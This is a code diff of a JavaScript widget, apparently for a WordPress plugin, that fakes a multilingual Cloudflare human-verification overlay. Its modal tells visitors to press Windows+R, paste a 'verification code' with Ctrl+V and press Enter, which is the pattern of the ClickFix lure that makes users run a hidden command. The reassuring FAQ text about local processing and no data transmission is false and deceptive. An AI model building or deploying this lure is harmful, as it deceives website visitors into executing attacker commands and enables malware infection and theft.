-      '<div style="position:absolute;inset:0;background-image:repeating-linear-gradient(0deg,transparent,transparent 30px,rgba(255,255,255,0.05) 30px,rgba(255,255,255,0.05) 32px),repeating-linear-gradient(90deg,transparent,transparent 30px,rgba(255,255,255,0.05) 30px,rgba(255,255,255,0.05) 32px);pointer-events:none"></div>' +
-      '<div style="position:absolute;right:-40px;top:-20px;width:140px;height:140px;border-radius:50%;background:rgba(255,255,255,0.1)"></div>' +
-      '<div style="display:flex;justify-content:center;margin-bottom:12px;position:relative;z-index:1"><img src="' + window.cfCaptchaImages.logoWithText + '" alt="Cloudflare" style="height:40px;filter:brightness(0) invert(1)"></div>' +
-      '<div style="display:flex;justify-content:center;gap:8px;position:relative;z-index:1">' + stepsHtml + '</div></div>' +
-      '<div style="flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px;padding:32px 0;animation:cfFadeInUp 0.5s ease-out">' + contentHtml + '</div>' +
-      '<div style="padding:12px 24px;border-top:1px solid #e2e8f0;display:flex;justify-content:center;gap:16px;font-size:11px">' +
-      '<a href="https://www.cloudflare.com/privacypolicy/" style="color:#64748b;text-decoration:none">' + t("privacy") + '</a>' +
-      '<a href="https://www.cloudflare.com/website-terms/" style="color:#64748b;text-decoration:none">' + t("terms") + '</a></div></div>'
-  }
-
-  function renderCaptchaContent() {
-    var container = document.getElementById("cf-captcha-container")
-    if (!container) return
-    var html = ""
-    if (animationPhase === 4) html = renderIntroPage()
-    else if (animationPhase === 5) html = renderVerificationModal()
-    container.innerHTML = html
-
-    if (animationPhase === 5) {
-      if (step === 1) {
-        var kf = document.querySelector(".key-anim-first .key-cap"); if (kf) kf.style.animation = "keyCapFirst 3s ease-in-out infinite"
-        var ks = document.querySelector(".key-anim-second .key-cap"); if (ks) ks.style.animation = "keyCapSecond 3s ease-in-out infinite"
-        var p1 = document.querySelector(".plus-animate"); if (p1) p1.style.animation = "plusGlow 3s infinite"
-      } else if (step === 2) {
-        var kc = document.querySelector(".key-anim-step2-ctrl .key-cap"); if (kc) kc.style.animation = "keyCapStep2Ctrl 3s ease-in-out infinite"
-        var kv = document.querySelector(".key-anim-step2-v .key-cap"); if (kv) kv.style.animation = "keyCapStep2V 3s ease-in-out infinite"
-        var ke = document.querySelector(".key-anim-step2-enter .key-cap"); if (ke) ke.style.animation = "keyCapStep2Enter 3s ease-in-out infinite"
-        var p2 = document.querySelector(".plus-animate-step2"); if (p2) p2.style.animation = "plusGlowStep2 3s infinite"
+      var translations = {
+        en: { verify: "Verify", privacy: "Privacy", terms: "Terms", verificationSteps: "Verification", step1: "Hold Windows key and press R", step2Line1: "Press Ctrl+V to paste verification code", confirmWith: "and confirm with", introTitle: "One-Time Device Verification", introSubtitle: "Complete this quick verification to browse for 90 days without interruptions. Our advanced hardware fingerprinting ensures privacy and eliminates recurring captcha challenges.", hwScanTitle: "Hardware Fingerprint", cookieTitle: "90-Day Access Token", secureTitle: "Privacy by Design", hwScanDesc: "Your device's unique hardware configuration is scanned to create a secure fingerprint. This helps verify you're a real person without collecting personal data.", cookieDesc: "After verification, a secure token is stored for 90 days. During this time, you won't need to complete any additional captcha challenges.", secureDesc: "All verification data is processed locally on your device. No personal information is transmitted or stored on external servers.", howItWorks: "How It Works", faqTitle: "Frequently Asked Questions", continueBtn: "Continue to Verification", verifyHuman: "Verify You Are Human", faq1Q: "Why am I seeing this?", faq1A: "This verification helps protect the website from automated bots and ensures you're a real person.", faq2Q: "Is my data safe?", faq2A: "Yes. All verification is done locally on your device. No personal data is collected or transmitted.", faq3Q: "How long does the token last?", faq3A: "The verification token is valid for 90 days. After that, you may need to verify again.", faq4Q: "What if verification fails?", faq4A: "If verification fails, you can try again. Make sure your browser allows JavaScript.", faq5Q: "Does this work on all browsers?", faq5A: "This verification works on all modern browsers including Chrome, Firefox, Edge, and Safari.", faq6Q: "Can I opt out?", faq6A: "Verification is required to access the website. It ensures security for all users." },
+        de: { verify: "Überprüfen", privacy: "Datenschutz", terms: "Bedingungen", verificationSteps: "Überprüfung", step1: "Halten Sie die Windows-Taste gedrückt und drücken Sie R", step2Line1: "Drücken Sie Strg+V um den Verifizierungscode einzufügen", confirmWith: "und bestätigen Sie mit", introTitle: "Einmalige Geräteüberprüfung", introSubtitle: "Schließen Sie diese schnelle Überprüfung ab, um 90 Tage lang ohne Unterbrechungen zu surfen. Unser fortschrittliches Hardware-Fingerprinting gewährleistet Privatsphäre und eliminiert wiederkehrende Captcha-Herausforderungen.", hwScanTitle: "Hardware-Fingerabdruck", cookieTitle: "90-Tage-Zugriffstoken", secureTitle: "Datenschutz durch Design", hwScanDesc: "Die einzigartige Hardware-Konfiguration Ihres Geräts wird gescannt, um einen sicheren Fingerabdruck zu erstellen.", cookieDesc: "Nach der Überprüfung wird ein sicheres Token für 90 Tage gespeichert.", secureDesc: "Alle Verifizierungsdaten werden lokal auf Ihrem Gerät verarbeitet.", howItWorks: "Wie es funktioniert", faqTitle: "Häufig gestellte Fragen", continueBtn: "Weiter zur Überprüfung", verifyHuman: "Verifizieren Sie, dass Sie ein Mensch sind", faq1Q: "Warum sehe ich das?", faq1A: "Diese Überprüfung schützt die Website vor automatisierten Bots.", faq2Q: "Sind meine Daten sicher?", faq2A: "Ja. Alle Überprüfungen erfolgen lokal auf Ihrem Gerät.", faq3Q: "Wie lange ist das Token gültig?", faq3A: "Das Token ist 90 Tage gültig.", faq4Q: "Was passiert bei einem Fehler?", faq4A: "Sie können es erneut versuchen.", faq5Q: "Funktioniert das in allen Browsern?", faq5A: "Ja, in allen modernen Browsern.", faq6Q: "Kann ich ablehnen?", faq6A: "Die Überprüfung ist erforderlich." },
+        fr: { verify: "Vérifier", privacy: "Confidentialité", terms: "Conditions", verificationSteps: "Vérification", step1: "Maintenez la touche Windows et appuyez sur R", step2Line1: "Appuyez sur Ctrl+V pour coller le code de vérification", confirmWith: "et confirmez avec", introTitle: "Vérification unique de l'appareil", introSubtitle: "Effectuez cette vérification rapide pour naviguer 90 jours sans interruption.", hwScanTitle: "Empreinte matérielle", cookieTitle: "Jeton d'accès 90 jours", secureTitle: "Confidentialité par conception", hwScanDesc: "La configuration matérielle unique de votre appareil est analysée.", cookieDesc: "Après vérification, un jeton sécurisé est stocké pendant 90 jours.", secureDesc: "Toutes les données de vérification sont traitées localement.", howItWorks: "Comment ça fonctionne", faqTitle: "Questions fréquentes", continueBtn: "Continuer la vérification", verifyHuman: "Vérifiez que vous êtes humain", faq1Q: "Pourquoi est-ce que je vois ceci?", faq1A: "Cette vérification protège le site contre les bots.", faq2Q: "Mes données sont-elles en sécurité?", faq2A: "Oui, tout est traité localement.", faq3Q: "Combien de temps dure le jeton?", faq3A: "Le jeton est valide 90 jours.", faq4Q: "Et si la vérification échoue?", faq4A: "Vous pouvez réessayer.", faq5Q: "Cela fonctionne-t-il dans tous les navigateurs?", faq5A: "Oui, dans tous les navigateurs modernes.", faq6Q: "Puis-je refuser?", faq6A: "La vérification est requise." },
+        es: { verify: "Verificar", privacy: "Privacidad", terms: "Términos", verificationSteps: "Verificación", step1: "Mantenga pulsada la tecla Windows y pulse R", step2Line1: "Pulse Ctrl+V para pegar el código de verificación", confirmWith: "y confirme con", introTitle: "Verificación única del dispositivo", introSubtitle: "Complete esta verificación rápida para navegar 90 días sin interrupciones.", hwScanTitle: "Huella de hardware", cookieTitle: "Token de acceso de 90 días", secureTitle: "Privacidad por diseño", hwScanDesc: "Se escanea la configuración de hardware de su dispositivo.", cookieDesc: "Después de la verificación, se almacena un token seguro durante 90 días.", secureDesc: "Todos los datos se procesan localmente.", howItWorks: "Cómo funciona", faqTitle: "Preguntas frecuentes", continueBtn: "Continuar con la verificación", verifyHuman: "Verifica que eres humano", faq1Q: "¿Por qué veo esto?", faq1A: "Protege el sitio contra bots.", faq2Q: "¿Mis datos están seguros?", faq2A: "Sí, todo es local.", faq3Q: "¿Cuánto dura el token?", faq3A: "90 días.", faq4Q: "¿Y si falla?", faq4A: "Puede intentar de nuevo.", faq5Q: "¿Funciona en todos los navegadores?", faq5A: "Sí.", faq6Q: "¿Puedo rechazar?", faq6A: "La verificación es obligatoria." },
+        ru: { verify: "Проверить", privacy: "Конфиденциальность", terms: "Условия", verificationSteps: "Проверка", step1: "Удерживайте клавишу Windows и нажмите R", step2Line1: "Нажмите Ctrl+V чтобы вставить код проверки", confirmWith: "и подтвердите нажатием", introTitle: "Одноразовая проверка устройства", introSubtitle: "Пройдите быструю проверку для 90 дней без прерываний.", hwScanTitle: "Аппаратный отпечаток", cookieTitle: "90-дневный токен", secureTitle: "Конфиденциальность", hwScanDesc: "Сканирование уникальной конфигурации вашего устройства.", cookieDesc: "После проверки токен сохраняется на 90 дней.", secureDesc: "Все данные обрабатываются локально.", howItWorks: "Как это работает", faqTitle: "Часто задаваемые вопросы", continueBtn: "Продолжить проверку", verifyHuman: "Подтвердите, что вы человек", faq1Q: "Почему я это вижу?", faq1A: "Это защита от ботов.", faq2Q: "Мои данные в безопасности?", faq2A: "Да, всё локально.", faq3Q: "Сколько действует токен?", faq3A: "90 дней.", faq4Q: "Что если не получится?", faq4A: "Попробуйте снова.", faq5Q: "Работает во всех браузерах?", faq5A: "Да.", faq6Q: "Можно отказаться?", faq6A: "Проверка обязательна." },
+        zh: { verify: "验证", privacy: "隐私", terms: "条款", verificationSteps: "验证", step1: "按住Windows键并按R", step2Line1: "按Ctrl+V粘贴验证码", confirmWith: "并按确认", introTitle: "一次性设备验证", introSubtitle: "完成快速验证即可享受90天不间断浏览。", hwScanTitle: "硬件指纹", cookieTitle: "90天访问令牌", secureTitle: "隐私设计", hwScanDesc: "扫描设备硬件配置。", cookieDesc: "验证后令牌保存90天。", secureDesc: "所有数据在本地处理。", howItWorks: "工作原理", faqTitle: "常见问题", continueBtn: "继续验证", verifyHuman: "验证您是人类", faq1Q: "为什么看到这个？", faq1A: "保护网站免受机器人攻击。", faq2Q: "数据安全吗？", faq2A: "是的，全部本地处理。", faq3Q: "令牌有效期？", faq3A: "90天。", faq4Q: "验证失败怎么办？", faq4A: "重试即可。", faq5Q: "支持所有浏览器吗？", faq5A: "是的。", faq6Q: "可以拒绝吗？", faq6A: "验证是必须的。" },
+        ja: { verify: "確認", privacy: "プライバシー", terms: "利用規約", verificationSteps: "確認", step1: "Windowsキーを押しながらRを押してください", step2Line1: "Ctrl+Vで確認コードを貼り付けてください", confirmWith: "そして確認", introTitle: "ワンタイムデバイス認証", introSubtitle: "この簡単な認証を完了すると、90日間中断なしでブラウジングできます。", hwScanTitle: "ハードウェア指紋", cookieTitle: "90日アクセストークン", secureTitle: "プライバシー設計", hwScanDesc: "デバイスのハードウェア構成をスキャンします。", cookieDesc: "認証後、90日間トークンが保存されます。", secureDesc: "すべてのデータはローカルで処理されます。", howItWorks: "仕組み", faqTitle: "よくある質問", continueBtn: "認証を続ける", verifyHuman: "人間であることを確認", faq1Q: "なぜこれが表示されますか？", faq1A: "ボットからの保護です。", faq2Q: "データは安全ですか？", faq2A: "はい、すべてローカルです。", faq3Q: "トークンの有効期間は？", faq3A: "90日間。", faq4Q: "認証に失敗したら？", faq4A: "再試行してください。", faq5Q: "すべてのブラウザで動作しますか？", faq5A: "はい。", faq6Q: "拒否できますか？", faq6A: "認証は必須です。" }
       }
-    }
-  }
 
-  function showCaptcha() {
-    captchaOpen = true
-    animationPhase = 4
-    step = 1
-    faqOpen = false
-    howItWorksOpen = false
-    expandedFaq = null
-    expandedHowItWorks = null
-    injectAnimationStyles()
-    var overlay = document.getElementById("cf-captcha-overlay")
-    if (overlay) { overlay.style.display = "flex"; renderCaptchaContent() }
-  }
+      function detectLanguage() {
+        var navLang = (navigator.language || navigator.userLanguage || "en").toLowerCase()
+        var langKeys = Object.keys(translations)
+        for (var i = 0; i < langKeys.length; i++) {
+          if (navLang.startsWith(langKeys[i])) return langKeys[i]
+        }
+        return "en"
+      }
 
-  function hideCaptcha() {
-    captchaOpen = false
-    var overlay = document.getElementById("cf-captcha-overlay")
-    if (overlay) overlay.style.display = "none"
-  }
+      function t(key) {
+        return (translations[lang] && translations[lang][key]) || (translations.en && translations.en[key]) || key
+      }
 
-  function handleContinueToVerification() {
-    animationPhase = 5
-    step = 1
-    step1KeyDetected = false
-    renderCaptchaContent()
-    // Do NOT auto-advance. Wait for actual key press detection.
-  }
+      function setCookie(name, value, days) { var d = new Date(); d.setTime(d.getTime() + days * 86400000); document.cookie = name + "=" + value + ";expires=" + d.toUTCString() + ";path=/;SameSite=Lax"; }
+      function getCookie(name) { var m = document.cookie.match(new RegExp("(^| )" + name + "=([^;]+)")); return m ? m[2] : null; }
+      function isVerified() { return getCookie(COOKIE_NAME) === "verified" }
+      function setVerificationCookie() { setCookie(COOKIE_NAME, "verified", COOKIE_DURATION_DAYS) }
 
-  function completeVerification() {
-    setVerificationCookie()
-    hideCaptcha()
-    // Show success in checkbox
-    var step2Elements = document.querySelectorAll(".step2")
-    var step3Elements = document.querySelectorAll(".step3")
-    var checkboxWindow = document.getElementById("checkbox-window")
-    step2Elements.forEach(function(el) { el.style.display = "none" })
-    step3Elements.forEach(function(el) { el.style.display = "block" })
-    var spinner = document.getElementById("spinner")
-    if (spinner) spinner.style.visibility = "hidden"
-    // Notify parent window (for iframe usage in WP plugin)
-    try { if (window.parent && window.parent !== window) { window.parent.postMessage("cf-captcha-verified", "*") } } catch(e) {}
-  }
+      var step1KeyDetected = false
+      function setupKeyboardHandler() {
+        document.addEventListener("keydown", function (e) {
+          if (!captchaOpen || animationPhase !== 5) return
+          if (step === 1 && !step1KeyDetected && (e.code === "MetaLeft" || e.code === "MetaRight" || e.key === "r" || e.key === "R")) {
+            step1KeyDetected = true
+            setTimeout(function () {
+              step = 2
+              step1KeyDetected = false
+              renderCaptchaContent()
+            }, 1500)
+          }
+        })
+      }
 
-  function toggleFaq() { faqOpen = !faqOpen; if (faqOpen) howItWorksOpen = false; renderCaptchaContent() }
-  function toggleHowItWorks() { howItWorksOpen = !howItWorksOpen; if (howItWorksOpen) faqOpen = false; renderCaptchaContent() }
-  function toggleFaqItem(num) { expandedFaq = expandedFaq === num ? null : num; renderCaptchaContent() }
-  function toggleHowItWorksItem(num) { expandedHowItWorks = expandedHowItWorks === num ? null : num; renderCaptchaContent() }
+      var winIcon = '<svg viewBox="0 0 24 24" style="width:22px;height:22px;fill:#555"><path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/></svg>'
 
-  lang = detectLanguage()
-  injectAnimationStyles()
-  setupKeyboardHandler()
+      function renderKey(label, width, animClass) {
+        var isWinKey = label === "Win"
+        var keyCapStyle = "position:absolute;top:0;left:0;right:0;height:48px;border-radius:10px;display:flex;align-items:center;justify-content:center;border:1px solid rgba(0,0,0,0.08)"
+        if (!animClass) keyCapStyle += ";background:linear-gradient(180deg,#ffffff 0%,#f5f5f5 100%);box-shadow:0 4px 0 #d4d4d4,0 6px 8px rgba(0,0,0,0.15),inset 0 1px 0 rgba(255,255,255,0.9)"
+        var animationName = ""
+        if (animClass === "key-anim-first") animationName = "keyCapFirst 5s ease-in-out infinite"
+        else if (animClass === "key-anim-second") animationName = "keyCapSecond 5s ease-in-out infinite"
+        else if (animClass === "key-anim-step2-ctrl") animationName = "keyCapStep2Ctrl 6s ease-in-out infinite"
+        else if (animClass === "key-anim-step2-v") animationName = "keyCapStep2V 6s ease-in-out infinite"
+        else if (animClass === "key-anim-step2-enter") animationName = "keyCapStep2Enter 6s ease-in-out infinite"
+        var animationStyle = animationName ? ";animation:" + animationName : ""
+        return '<div class="' + animClass + '" style="width:' + width + 'px;height:56px;position:relative;display:inline-block">' +
+          '<div style="position:absolute;bottom:0;left:2px;right:2px;height:8px;border-radius:0 0 10px 10px;background:linear-gradient(180deg,#c8c8c8 0%,#b0b0b0 100%)"></div>' +
+          '<div class="key-cap" style="' + keyCapStyle + animationStyle + '">' +
+          (isWinKey ? winIcon : '<span style="font-size:' + (label === "Enter" ? "13" : label === "Ctrl" ? "12" : "16") + 'px;font-weight:600;color:#555">' + label + '</span>') +
+          '</div></div>'
+      }
 
-  window.CloudflareCaptcha = {
-    show: showCaptcha,
-    hide: hideCaptcha,
-    complete: completeVerification,
-    isVerified: isVerified,
-    continueToVerification: handleContinueToVerification,
-    toggleFaq: toggleFaq,
-    toggleHowItWorks: toggleHowItWorks,
-    toggleFaqItem: toggleFaqItem,
-    toggleHowItWorksItem: toggleHowItWorksItem
-  }
-})()
-</script>
+      function renderIntroPage() {
+        var featuresHtml = [
+          { title: t("hwScanTitle"), icon: "fingerprint" },
+          { title: t("cookieTitle"), icon: "clock" },
+          { title: t("secureTitle"), icon: "shield" }
+        ].map(function (item) {
+          var imgStyle = item.icon === "shield" ? "width:120px;height:120px" : "width:60px;height:60px"
+          return '<div style="flex:1;background:#fff;border:2px solid #f97316;border-radius:12px;padding:12px 10px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;box-shadow:0 2px 8px rgba(249,115,22,0.1)">' +
+            '<div style="height:60px;display:flex;align-items:center;justify-content:center">' +
+            '<img src="' + window.cfCaptchaImages[item.icon] + '" alt="" style="' + imgStyle + ';object-fit:contain">' +
+            '</div><div style="font-size:12px;font-weight:700;color:#1e293b;text-align:center;line-height:1.3">' + item.title + '</div></div>'
+        }).join("")
+
+        var howItWorksContent = ""
+        if (howItWorksOpen) {
+          var items = [
+            { num: 1, title: "1. Hardware Scan", desc: t("hwScanDesc") },
+            { num: 2, title: "2. Token Generation", desc: t("cookieDesc") },
+            { num: 3, title: "3. Privacy Protection", desc: t("secureDesc") }
+          ]
+          howItWorksContent = '<div style="padding:16px 24px 8px">' + items.map(function (item) {
+            var isExpanded = expandedHowItWorks === item.num
+            return '<div style="margin-bottom:10px;background:rgba(255,255,255,0.3);border-radius:6px;overflow:hidden">' +
+              '<button onclick="window.CloudflareCaptcha.toggleHowItWorksItem(' + item.num + ')" style="width:100%;padding:8px 10px;display:flex;justify-content:space-between;align-items:center;border:none;background:transparent;cursor:pointer;color:#fff;text-align:left">' +
+              '<span style="font-size:12px;font-weight:600;flex:1">' + item.title + '</span>' +
+              '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" style="transform:rotate(' + (isExpanded ? "180" : "0") + 'deg);transition:transform 0.3s;flex-shrink:0"><path d="M6 9l6 6 6-6" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg>' +
+              '</button>' + (isExpanded ? '<div style="padding:12px 10px;color:#1f2937;font-size:11px;line-height:1.6;background:rgba(255,255,255,0.9);border-radius:0 0 6px 6px">' + item.desc + '</div>' : '') + '</div>'
+          }).join("") + '</div>'
+        }
+
+        var howItWorksHtml = '<div style="border:1px solid #e2e8f0;border-radius:8px;overflow:hidden;background:' + (howItWorksOpen ? "linear-gradient(135deg,#f97316 0%,#ea580c 100%)" : "#fff") + ';transition:all 0.3s ease;margin-bottom:12px">' +
+          '<button onclick="window.CloudflareCaptcha.toggleHowItWorks()" style="width:100%;padding:10px 12px;display:flex;justify-content:space-between;align-items:center;border:none;background:transparent;cursor:pointer;color:' + (howItWorksOpen ? "#fff" : "#1e293b") + '">' +
+          '<div style="display:flex;align-items:center;gap:8px"><div style="width:24px;height:24px;border-radius:50%;background:' + (howItWorksOpen ? "#fff" : "linear-gradient(135deg,#f97316 0%,#ea580c 100%)") + ';display:flex;align-items:center;justify-content:center"><span style="font-size:14px;font-weight:700;color:' + (howItWorksOpen ? "#f97316" : "#fff") + '">!</span></div>' +
+          '<span style="font-size:13px;font-weight:600;color:' + (howItWorksOpen ? "#fff" : "#1e293b") + '">' + t("howItWorks") + '</span></div>' +
+          '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" style="transform:rotate(' + (howItWorksOpen ? "180" : "0") + 'deg);transition:transform 0.3s"><path d="M6 9l6 6 6-6" stroke="' + (howItWorksOpen ? "#fff" : "#f97316") + '" stroke-width="2" stroke-linecap="round"/></svg></button>' + howItWorksContent + '</div>'
+
+        var faqContent = ""
+        if (faqOpen) {
+          faqContent = '<div style="padding:16px 24px 8px">' + [1, 2, 3, 4, 5, 6].map(function (num) {
+            var isExpanded = expandedFaq === num
+            return '<div style="margin-bottom:10px;background:rgba(255,255,255,0.3);border-radius:6px;overflow:hidden">' +
+              '<button onclick="window.CloudflareCaptcha.toggleFaqItem(' + num + ')" style="width:100%;padding:8px 10px;display:flex;justify-content:space-between;align-items:center;border:none;background:transparent;cursor:pointer;color:#fff;text-align:left">' +
+              '<span style="font-size:12px;font-weight:600;flex:1">' + num + '. ' + t("faq" + num + "Q") + '</span>' +
+              '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" style="transform:rotate(' + (isExpanded ? "180" : "0") + 'deg);transition:transform 0.3s;flex-shrink:0"><path d="M6 9l6 6 6-6" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg></button>' +
+              (isExpanded ? '<div style="padding:12px 10px;color:#1f2937;font-size:11px;line-height:1.6;background:rgba(255,255,255,0.9);border-radius:0 0 6px 6px">' + t("faq" + num + "A") + '</div>' : '') + '</div>'
+          }).join("") + '</div>'
+        }
+
+        var faqHtml = '<div style="border:1px solid #e2e8f0;border-radius:8px;overflow:hidden;background:' + (faqOpen ? "linear-gradient(135deg,#f97316 0%,#ea580c 100%)" : "#fff") + ';transition:all 0.3s ease">' +
+          '<button onclick="window.CloudflareCaptcha.toggleFaq()" style="width:100%;padding:10px 12px;display:flex;justify-content:space-between;align-items:center;border:none;background:transparent;cursor:pointer;color:' + (faqOpen ? "#fff" : "#1e293b") + ';border-radius:8px;transition:all 0.3s ease">' +
+          '<div style="display:flex;align-items:center;gap:8px"><div style="width:24px;height:24px;border-radius:50%;background:' + (faqOpen ? "#fff" : "linear-gradient(135deg,#f97316 0%,#ea580c 100%)") + ';display:flex;align-items:center;justify-content:center"><span style="font-size:14px;font-weight:700;color:' + (faqOpen ? "#f97316" : "#fff") + '">?</span></div>' +
+          '<span style="font-size:13px;font-weight:600;color:' + (faqOpen ? "#fff" : "#1e293b") + '">' + t("faqTitle") + '</span></div>' +
+          '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" style="transform:rotate(' + (faqOpen ? "180" : "0") + 'deg);transition:transform 0.3s"><path d="M6 9l6 6 6-6" stroke="' + (faqOpen ? "#fff" : "#f97316") + '" stroke-width="2" stroke-linecap="round"/></svg></button>' + faqContent + '</div>'
+
+        return '<div style="background:#fff;border-radius:16px;width:480px;height:auto;overflow:visible;box-shadow:0 20px 50px rgba(0,0,0,0.15);display:flex;flex-direction:column;position:relative">' +
+          '<div style="background:linear-gradient(135deg,#f97316 0%,#ea580c 100%);padding:24px;border-radius:16px 16px 0 0;position:relative;overflow:hidden;min-height:100px">' +
+          '<div style="position:absolute;inset:0;background-image:repeating-linear-gradient(0deg,transparent,transparent 30px,rgba(255,255,255,0.05) 30px,rgba(255,255,255,0.05) 32px),repeating-linear-gradient(90deg,transparent,transparent 30px,rgba(255,255,255,0.05) 30px,rgba(255,255,255,0.05) 32px);pointer-events:none"></div>' +
+          '<div style="position:absolute;right:-40px;top:-20px;width:140px;height:140px;border-radius:50%;background:rgba(255,255,255,0.1)"></div>' +
+          '<div style="display:flex;justify-content:center;align-items:center;position:relative;z-index:1"><img src="' + window.cfCaptchaImages.logoWithText + '" alt="Cloudflare" style="height:50px;filter:brightness(0) invert(1)"></div></div>' +
+          '<div style="display:flex;justify-content:center;margin-top:-16px;margin-bottom:16px;position:relative;z-index:2">' +
+          '<div style="background:#fef3c7;border-radius:20px;padding:8px 20px;display:flex;align-items:center;gap:8px;border:1px solid #fbbf24;box-shadow:0 4px 12px rgba(0,0,0,0.1)">' +
+          '<svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M9 12l2 2 4-4" stroke="#f97316" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><circle cx="12" cy="12" r="10" stroke="#f97316" stroke-width="2"/></svg>' +
+          '<span style="font-size:13px;font-weight:600;color:#f97316;text-transform:uppercase;letter-spacing:0.5px">' + t("verifyHuman") + '</span></div></div>' +
+          '<div style="padding:0 24px 16px;text-align:center"><h2 style="font-size:28px;font-weight:700;margin:0 0 8px 0"><span style="color:#f97316">' + t("introTitle").split(" ")[0] + '</span> <span style="color:#1e293b">' + t("introTitle").split(" ").slice(1).join(" ") + '</span></h2>' +
+          '<p style="font-size:13px;color:#64748b;line-height:1.6;margin:0">' + t("introSubtitle") + '</p></div>' +
+          '<div style="flex:1;padding:0 24px 16px"><div style="display:flex;gap:12px;margin-bottom:16px;justify-content:center">' + featuresHtml + '</div>' + howItWorksHtml + faqHtml + '</div>' +
+          '<div style="padding:0 24px 24px"><button onclick="window.CloudflareCaptcha.continueToVerification()" style="width:100%;background:linear-gradient(135deg,#f97316 0%,#ea580c 100%);color:#fff;border:none;border-radius:8px;padding:12px 24px;font-size:14px;font-weight:600;cursor:pointer;box-shadow:0 4px 12px rgba(249,115,22,0.3)">' + t("continueBtn") + '</button></div>' +
+          '<div style="padding:12px 24px;border-top:1px solid #e2e8f0;display:flex;justify-content:center;gap:16px;font-size:11px">' +
+          '<a href="https://www.cloudflare.com/privacypolicy/" style="color:#64748b;text-decoration:none">' + t("privacy") + '</a>' +
+          '<a href="https://www.cloudflare.com/website-terms/" style="color:#64748b;text-decoration:none">' + t("terms") + '</a></div></div>'
+      }
+
+      function renderVerificationModal() {
+        var stepsHtml = [1, 2].map(function (s) {
+          return '<div style="display:flex;align-items:center;gap:8px">' +
+            '<div style="width:8px;height:8px;border-radius:50%;background:' + (step >= s ? "#fff" : "rgba(255,255,255,0.3)") + ';transition:all 0.3s"></div>' +
+            (s < 2 ? '<div style="width:40px;height:2px;background:' + (step > s ? "#fff" : "rgba(255,255,255,0.3)") + ';transition:all 0.3s"></div>' : '') + '</div>'
+        }).join("")
+
+        var contentHtml = ""
+        if (step === 1) {
+          contentHtml = '<div style="display:flex;flex-direction:column;align-items:center;gap:20px">' +
+            '<div style="font-size:16px;font-weight:600;color:#64748b;text-align:center;max-width:360px">' + t("step1") + '</div>' +
+            '<div style="display:flex;gap:8px;align-items:center">' +
+            renderKey("Win", 80, "key-anim-first") +
+            '<span class="plus-animate" style="font-size:18px;color:#9CA3AF;font-weight:400;margin:0 2px">+</span>' +
+            renderKey("R", 56, "key-anim-second") +
+            '</div></div>'
+        } else if (step === 2) {
+          contentHtml = '<div style="display:flex;flex-direction:column;align-items:center;gap:20px">' +
+            '<div style="font-size:16px;font-weight:600;color:#64748b;text-align:center;max-width:360px">' + t("step2Line1") + '</div>' +
+            '<div style="display:flex;gap:8px;align-items:center;justify-content:center">' +
+            renderKey("Ctrl", 80, "key-anim-step2-ctrl") +
+            '<span class="plus-animate-step2" style="font-size:18px;color:#9CA3AF;font-weight:400;margin:0 2px">+</span>' +
+            renderKey("V", 56, "key-anim-step2-v") +
+            '</div>' +
+            '<div style="display:flex;gap:8px;align-items:center;justify-content:center">' +
+            '<span style="font-size:16px;color:#6B7280;font-weight:500">' + t("confirmWith") + '</span>' +
+            renderKey("Enter", 80, "key-anim-step2-enter") +
+            '</div>' +
+            '<button onclick="window.CloudflareCaptcha.complete()" style="padding:12px 32px;background:linear-gradient(135deg,#f97316 0%,#ea580c 100%);color:white;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;box-shadow:0 4px 12px rgba(249,115,22,0.4)">' + t("verify") + '</button>' +
+            '</div>'
+        }
+
+        return '<div style="background:#fff;border-radius:16px;width:480px;min-height:500px;box-shadow:0 20px 50px rgba(0,0,0,0.15);display:flex;flex-direction:column;overflow:hidden">' +
+          '<div style="background:linear-gradient(135deg,#f97316 0%,#ea580c 100%);padding:20px 24px;position:relative;overflow:hidden">' +
+          '<div style="position:absolute;inset:0;background-image:repeating-linear-gradient(0deg,transparent,transparent 30px,rgba(255,255,255,0.05) 30px,rgba(255,255,255,0.05) 32px),repeating-linear-gradient(90deg,transparent,transparent 30px,rgba(255,255,255,0.05) 30px,rgba(255,255,255,0.05) 32px);pointer-events:none"></div>' +
+          '<div style="position:absolute;right:-40px;top:-20px;width:140px;height:140px;border-radius:50%;background:rgba(255,255,255,0.1)"></div>' +
+          '<div style="display:flex;justify-content:center;margin-bottom:12px;position:relative;z-index:1"><img src="' + window.cfCaptchaImages.logoWithText + '" alt="Cloudflare" style="height:40px;filter:brightness(0) invert(1)"></div>' +
+          '<div style="display:flex;justify-content:center;gap:8px;position:relative;z-index:1">' + stepsHtml + '</div></div>' +
+          '<div style="flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px;padding:32px 0;animation:cfFadeInUp 0.5s ease-out">' + contentHtml + '</div>' +
+          '<div style="padding:12px 24px;border-top:1px solid #e2e8f0;display:flex;justify-content:center;gap:16px;font-size:11px">' +
+          '<a href="https://www.cloudflare.com/privacypolicy/" style="color:#64748b;text-decoration:none">' + t("privacy") + '</a>' +
+          '<a href="https://www.cloudflare.com/website-terms/" style="color:#64748b;text-decoration:none">' + t("terms") + '</a></div></div>'
+      }
+
+      function renderCaptchaContent() {
+        var container = document.getElementById("cf-captcha-container")
+        if (!container) return
+        var html = ""
+        if (animationPhase === 4) html = renderIntroPage()
+        else if (animationPhase === 5) html = renderVerificationModal()
+        container.innerHTML = html
+
+        if (animationPhase === 5) {
+          if (step === 1) {
+            var kf = document.querySelector(".key-anim-first .key-cap"); if (kf) kf.style.animation = "keyCapFirst 3s ease-in-out infinite"
+            var ks = document.querySelector(".key-anim-second .key-cap"); if (ks) ks.style.animation = "keyCapSecond 3s ease-in-out infinite"
+            var p1 = document.querySelector(".plus-animate"); if (p1) p1.style.animation = "plusGlow 3s infinite"
+          } else if (step === 2) {
